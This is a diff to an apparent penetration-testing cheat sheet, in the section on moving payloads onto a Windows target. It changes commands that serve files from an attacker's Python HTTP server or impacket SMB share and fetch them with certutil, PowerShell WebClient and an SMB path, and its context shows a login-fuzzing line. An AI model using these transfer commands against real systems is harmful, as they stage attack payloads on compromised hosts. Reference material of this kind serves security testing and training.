@@ -1356,14 +1356,13 @@ username=admin$password=FUZZ
 # About: A python command used to open a server on the client machine
 # Download: Pre-installed on Kali Linux
 
-# USAGE - Host on client machine
+# Python Server
 sudo python3 -m http.server {PORT}
 
-# {PORT}: Port to open for file transfer
-
-
 # SMB SHARE
-impacket-smbserver temp $(pwd) -smb2support -user {USERNAME} -password {PASSWORD}
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./   
+
+# {PORT}: Port to open for file transfer
 ```
 <br />
 
@@ -1394,10 +1393,7 @@ certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')"
 
 # SMB SHARE
-$pass = convertto-securestring '{PASSWORD}' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('{USERNAME}', $pass)
-New-PSDrive -Name tempdrive -PSProvider FileSystem -Credential $cred -Root \\{IP ADDRESS}\temp
-cd tempdrive:
+\\{IP ADDRESS}\share\{FILE}
 
 # {IP ADDRESS}: IP Address of the client from step one
 # {FILE}:       The payload to be transferred
